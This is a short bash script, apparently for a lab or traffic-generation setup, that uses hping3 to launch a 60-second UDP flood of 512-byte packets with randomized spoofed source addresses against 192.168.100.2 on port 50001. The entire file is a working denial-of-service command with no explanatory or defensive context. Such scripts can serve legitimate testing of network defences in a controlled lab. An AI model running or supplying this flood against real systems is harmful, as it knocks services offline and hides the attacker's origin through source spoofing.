#!/bin/bash

# Hping3 UDP Flood (512 bytes) (60 seconds)
sudo timeout 60 hping3 -2 192.168.100.2 -p 50001 --rand-source -d 512 --flood